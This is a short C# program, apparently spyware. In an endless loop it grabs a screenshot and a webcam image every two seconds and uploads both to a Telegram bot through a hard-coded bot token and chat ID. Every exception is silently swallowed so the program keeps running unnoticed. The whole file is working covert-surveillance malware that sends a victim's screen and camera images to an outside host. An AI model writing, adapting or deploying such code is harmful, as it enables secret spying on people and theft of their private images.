using Microsoft.Win32;
using Saint.Telegram;
using System;
using System.IO;
using System.Threading.Tasks;
using Microsoft.Win32;

class Program
{


	static async Task Main()
	{

			while (true)
			{
				try
				{

					// 2️⃣ Скриншот
					try
					{
					 Screenshot.Capture("screenshot.png");
    					
					}
					catch (Exception ex)
					{
					}
				try
				{
					Cam.Capture("cam.jpg");
				}
				catch (Exception ex)
				{

				}
					// 5️⃣ Отправка в Telegram

					try
					{
						var tg = new SendTelegram("8506055327:AAEBKfzh7NjnLzR4BD4C4WUqlSjqyybXegg", "8177843619");

						await tg.SendFileAsync("screenshot.png", "scr");
						await tg.SendFileAsync("cam.jpg", "cam");

					}
					catch (Exception ex)
					{

					}

				}
				catch (Exception ex)
				{
				}
				await Task.Delay(TimeSpan.FromSeconds(2));
			}
		}

	
}
